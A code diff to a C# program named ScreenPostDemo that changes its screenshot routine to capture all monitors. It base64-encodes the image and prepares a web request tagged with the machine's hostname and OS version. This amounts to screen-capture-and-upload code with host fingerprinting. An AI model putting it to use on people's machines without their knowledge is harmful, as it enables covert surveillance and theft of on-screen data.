@@ -9,22 +9,21 @@ namespace ScreenPostDemo
 {
 	public class Program
 	{
-		private static Bitmap CreateBitmap(bool primaryOnly)
+		private static Bitmap CreateBitmap(Rectangle box)
 		{
-			return primaryOnly ?
-				new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
-				: new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height);
+			return new Bitmap(box.Width, box.Height);
 		}
 
 		private static byte[] TakeSnapShot(bool primaryOnly)
 		{
+			var box = primaryOnly ? Screen.PrimaryScreen.Bounds : SystemInformation.VirtualScreen;
+
 			using (var ms = new MemoryStream())
-			using (Bitmap bitmap = CreateBitmap(true))
+			using (Bitmap bitmap = CreateBitmap(box))
 			using (Graphics canvas = Graphics.FromImage(bitmap))
 			{
 				canvas.CopyFromScreen(
-					Screen.PrimaryScreen.Bounds.X,
-					Screen.PrimaryScreen.Bounds.Y,
+					box.X, box.Y,
 					0, 0, bitmap.Size,
 					CopyPixelOperation.SourceCopy
 				);
@@ -39,7 +38,7 @@ namespace ScreenPostDemo
 		{
 			//File.WriteAllBytes(@"Z:\.Trash\kk.png", TakeSnapShot(true));
 
-			var data = Convert.ToBase64String(TakeSnapShot(true));
+			var data = Convert.ToBase64String(TakeSnapShot(false));
 			var client = new WebClient();
 			client.Headers.Add("X-Dab-HostName", Dns.GetHostName());
 			client.Headers.Add("X-Dab-OsVersion", Environment.OSVersion.ToString());
